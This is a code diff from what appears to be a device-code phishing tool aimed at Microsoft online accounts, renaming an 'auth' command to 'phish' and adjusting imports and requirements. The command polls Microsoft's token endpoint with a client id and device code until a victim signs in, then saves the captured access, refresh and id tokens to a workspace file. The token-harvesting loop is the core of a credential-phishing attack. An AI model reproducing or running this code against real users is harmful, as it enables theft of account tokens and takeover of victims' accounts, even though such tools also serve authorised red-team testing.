@@ -1,33 +1,30 @@
 import time
 
-from msph.frameworks.cli import Command, display, ApplicationError
+from msph.framework.cli import Command, display, ApplicationError
 
-from ...validators import ClientIdRequired, WorkSpaceRequired, DeviceCodeRequired
-from ...clients import ms_online as client
-from ... import workspace
+from ....validators import ClientIdRequired, DeviceCodeRequired
+from ....clients import ms_online as client
+from .... import workspace
 from . import msgs
-from ...workspace.types import File
 
-
-auth = Command(
-    'auth', 
+phish = Command(
+    'phish', 
     description='Fetches the OAuth tokens in the following format access code, refresh token, and id token',
-    required=[WorkSpaceRequired(), ClientIdRequired(), DeviceCodeRequired()]
+    required=[ClientIdRequired(), DeviceCodeRequired()]
 )
 
-@auth.cli()
+@phish.cli()
 def cli(cmd):
     cmd.parser.add_argument('-v', '--verbose', 
         help="Verbose output of API status calls to check for Oauth token",
         action='store_true')
-
     cmd.parser.add_argument('-m', '--monitor',
         help="Fetch the OAuth tokens incrementally making API calls in monitor mode, this is preferred",
         action='store_true'
     )
     return cmd
 
-@auth.target()
+@phish.target()
 def target(settings):
     while True:
         r = client.get_access_token(settings.client_id, settings.device_code,
@@ -49,6 +46,6 @@ def target(settings):
             break
         time.sleep(1)
     workspace.settings_file.update(**tokens)
-    display(msgs.create_auth_success(**tokens))
+    display(msgs.create_auth_success())
 
 
